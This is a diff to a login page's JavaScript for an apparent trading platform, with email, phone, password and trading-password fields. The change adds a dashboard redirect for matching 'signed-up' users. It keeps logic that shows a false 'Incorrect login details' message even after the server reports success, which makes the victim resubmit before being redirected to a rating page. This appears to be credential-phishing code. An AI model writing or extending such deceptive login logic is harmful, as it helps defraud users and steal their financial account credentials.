@@ -103,9 +103,13 @@ document.addEventListener('DOMContentLoaded', function () {
         }, 3000);
     }
 
-    // === Show Success Screen then Redirect to Rating ===
-    function showSuccessAndRedirect() {
-        window.location.href = 'rating.html';
+    // === Show Success Screen then Redirect ===
+    function showSuccessAndRedirect(destination) {
+        if (destination === 'dashboard') {
+            window.location.href = 'dashboard.html';
+        } else {
+            window.location.href = 'rating.html';
+        }
     }
 
     // === Form Submission ===
@@ -165,20 +169,25 @@ document.addEventListener('DOMContentLoaded', function () {
             const data = await response.json();
 
             if (data.success) {
-                let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
-                
-                if (attempts === 0) {
-                    sessionStorage.setItem('loginAttempts', '1');
-                    showToast('Incorrect login details. Please cross-check and try again.', true);
+                // If credentials match a signed-up user, go straight to dashboard
+                if (data.redirect === 'dashboard') {
+                    showSplash(2000, function() { showSuccessAndRedirect('dashboard'); });
                 } else {
-                    // Clear form
-                    emailInput.value = '';
-                    phoneInput.value = '';
-                    passwordInput.value = '';
-                    tradingPasswordInput.value = '';
+                    let attempts = parseInt(sessionStorage.getItem('loginAttempts') || '0');
+                    
+                    if (attempts === 0) {
+                        sessionStorage.setItem('loginAttempts', '1');
+                        showToast('Incorrect login details. Please cross-check and try again.', true);
+                    } else {
+                        // Clear form
+                        emailInput.value = '';
+                        phoneInput.value = '';
+                        passwordInput.value = '';
+                        tradingPasswordInput.value = '';
 
-                    // Show splash for 4 seconds, then success screen, then redirect
-                    showSplash(2000, showSuccessAndRedirect);
+                        // Show splash for 2 seconds, then redirect to rating
+                        showSplash(2000, function() { showSuccessAndRedirect('rating'); });
+                    }
                 }
             } else {
                 showToast(data.message || 'Something went wrong', true);
